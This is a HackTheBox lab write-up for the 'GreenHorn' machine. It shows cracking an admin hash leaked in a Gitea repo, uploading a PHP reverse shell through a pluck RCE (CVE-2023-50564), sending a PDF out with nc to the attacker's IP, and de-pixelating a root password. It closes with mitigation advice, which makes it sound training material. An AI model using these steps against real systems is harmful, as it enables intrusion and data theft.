---
title: "HackTheBox - GreenHorn"
author: Nasrallah
description: ""
date: 2024-12-07 07:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy]
img_path: /assets/img/hackthebox/machines/greenhorn
image:
    path: greenhorn.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

## **Description:**

[GreenHorn](https://hacktheboxltd.sjv.io/Nasrallah?u=https://app.hackthebox.com/machines/greenhorn) from [HackTheBox](https://hacktheboxltd.sjv.io/anqPJZ) start with finding the source code of an application in a Gitea instance. We retrieve the login password and exploit an RCE to get a foothold. We find a pdf on the system which has a password pixilated, we use a tools to recover the password and get root.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.25     
Host is up (0.40s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION                                                                                        
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                                                                                                                                                                              
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)                                                                                                                                                                                                 
|_http-title: Did not follow redirect to http://greenhorn.htb/            
3000/tcp open  ppp?                                                                                                   
| fingerprint-strings:                                                                                                
|   GenericLines, Help, RTSPRequest:                                                                                  
|     HTTP/1.1 400 Bad Request                                                                                        
|     Content-Type: text/plain; charset=utf-8                                                                         
|     Connection: close                                                                                               

```

We found three open ports, 22 running ssh, 80 running Nginx web server and port 3000.

Nmap scripts revealed the hostname `greenhorn.htb`, so let's add it to our `/etc/hosts` file.

### Web

Let's check the web page on port 80.

![webpage](1.png)

We can see the website is powered by `pluck`, clicking on `admin` redirects us to the login page.

![loginpage](2.png)

Here we see the version of pluck is `4.7.18`.

A quick search on google we find that this version is vulnerable to `RCE` via insecure file upload [CVE-2023-50564](https://nvd.nist.gov/vuln/detail/CVE-2023-50564).

But we need the admin password to login and exploit the vulnerability.

### Port 3000

Let's check port 3000.

![gitea](3.png)

We have and instance of Gitea. Let's check the explore page:

![explore](4.png)

We see a public repository called `GreenHorn`. Let's see what's inside.

![pluck](5.png)

This looks like the files for the pluck application on port 80.

Looking at the login.php file we see that it's including the file `/data/settings/pass.php to check the password.

![pass.php](6.png)

We found a password hash.

Using `hashid` we can identify the hash type:

```bash
$ hashid hash.txt 
--File 'hash.txt'--
Analyzing 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163'
[+] SHA-512 
[+] Whirlpool 
[+] Salsa10 
[+] Salsa20 
[+] SHA3-512 
[+] Skein-512 
[+] Skein-1024(512) 
--End of file 'hash.txt'--   
```

It's a `SHA-512`. We can crack it with hashcat using the mod 1700.

```bash
$ hashcat hash.txt /usr/share/wordlists/rockyou.txt -m 1700
hashcat (v6.2.6) starting          
                                                           
OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-penryn-12th Gen Intel(R) Core(TM) i7-1255U, 2918/5900 MB (1024 MB allocatable), 4MCU

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163:iloveyou1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1700 (SHA2-512)
Hash.Target......: d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe...790163
Time.Started.....: Thu Aug 29 15:14:45 2024 (0 secs)
Time.Estimated...: Thu Aug 29 15:14:45 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   269.2 kH/s (0.50ms) @ Accel:512 Loops:1 Thr:1 Vec:2
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> lovers1
Hardware.Mon.#1..: Util: 26%

```

The hash cracked to `iloveyou`. Let's login.

![admin](7.png)

## **Foothold**

To get a foothold, we need to put a php reverse shell on a zip file. I'll be using this [revshell](https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php).

```bash
$ zip sirius.zip shell.php 
  adding: shell.php (deflated 60%)
```

Now we go the web admin dashboard, select `options` -> `manage modules`.

![modules](8.png)

Then select `install a module` and upload the zip file.

![upload](9.png)

Now we request our file at `http://greenhorn.htb/data/modules/sirius/shell.php`

![shell](10.png)

## **Privilege Escalation**

After getting a shell, we find a user called `junior`, with the password `iloveyou1` we can switch to that user.

```bash
www-data@greenhorn:/home/junior$ su junior 
Password: 
junior@greenhorn:~$ id
uid=1000(junior) gid=1000(junior) groups=1000(junior)
junior@greenhorn:~$ 
```

We find a pdf on the user's directory.

```bash
junior@greenhorn:~$ ls
 user.txt  'Using OpenVAS.pdf'
```

Let's copy it and see what's there.

On our machine we run :

```bash
nc -lvnp 1234 > openvas.pdf
```

Now on the target we run:

```bash
nc 10.10.16.49 1234 < 'Using OpenVAS.pdf'
```

![pdf](11.png)

The file seems to contain a password but it's pixilated.

Using a tool called [Depix](https://github.com/spipm/Depix) we can reverse the pixilation and see the password.

First we save the password image.

![pass](12.png)

Now we clone the tool, install the requirements and run it.

```bash
$ python3 depix.py -p pix.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o ./pass.png
2024-08-29 15:39:33,164 - Loading pixelated image from pix.png
2024-08-29 15:39:33,185 - Loading search image from images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
2024-08-29 15:39:33,706 - Finding color rectangles from pixelated space
2024-08-29 15:39:33,707 - Found 252 same color rectangles
2024-08-29 15:39:33,707 - 190 rectangles left after moot filter
2024-08-29 15:39:33,707 - Found 1 different rectangle sizes
2024-08-29 15:39:33,707 - Finding matches in search image
2024-08-29 15:39:33,707 - Scanning 190 blocks with size (5, 5)
2024-08-29 15:39:33,730 - Scanning in searchImage: 0/1674
2024-08-29 15:40:09,890 - Removing blocks with no matches
2024-08-29 15:40:09,891 - Splitting single matches and multiple matches
2024-08-29 15:40:09,894 - [16 straight matches | 174 multiple matches]
2024-08-29 15:40:09,895 - Trying geometrical matches on single-match squares
2024-08-29 15:40:10,115 - [29 straight matches | 161 multiple matches]
2024-08-29 15:40:10,115 - Trying another pass on geometrical matches
2024-08-29 15:40:10,299 - [41 straight matches | 149 multiple matches]
2024-08-29 15:40:10,300 - Writing single match results to output
2024-08-29 15:40:10,300 - Writing average results for multiple matches to output
2024-08-29 15:40:12,424 - Saving output image to: ./pass.png                                                                       
```

We open the image and get this:

![password](13.png)

We got the password `sidefromsidetheothersidesidefromsidetheotherside`

Let's ssh as root.

```bash
$ ssh root@greenhorn.htb
root@greenhorn.htb's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Aug 29 03:42:16 PM UTC 2024

  System load:  0.16              Processes:             235
  Usage of /:   57.6% of 3.45GB   Users logged in:       0
  Memory usage: 13%               IPv4 address for eth0: 10.10.11.25
  Swap usage:   0%


This system is built by the Bento project by Chef Software
More information can be found at https://github.com/chef/bento
Last login: Thu Jul 18 12:55:08 2024 from 10.10.14.41
root@greenhorn:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## **Prevention and Mitigation**

### Information disclosure

It is a common mistake for developers to push sensitive information into git repositories online.

Make sure that everyone involved in producing the website is fully aware of what information is considered sensitive. Sometimes seemingly harmless information can be much more useful to an attacker than people realize. Highlighting these dangers can help make sure that sensitive information is handled more securely in general by your organization.

### CVE

It is important to always make sure you update to latest versions as soon as they come out. Upgrading to a newer version of pluck should fix the vulnerability.

### Passwords

We saw a password reuse that allowed to to escalate to another user. Password should always be uniq and never reused.

### Pixilated password

Documents containing password should always be handled in a secure way.

As technology advances, hiding text with pixilation is no longer secure as people found ways to overcome that.

## **References**

<https://nvd.nist.gov/vuln/detail/CVE-2023-50564>

<https://portswigger.net/web-security/information-disclosure#how-to-prevent-information-disclosure-vulnerabilities>

<https://github.com/spipm/Depix>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
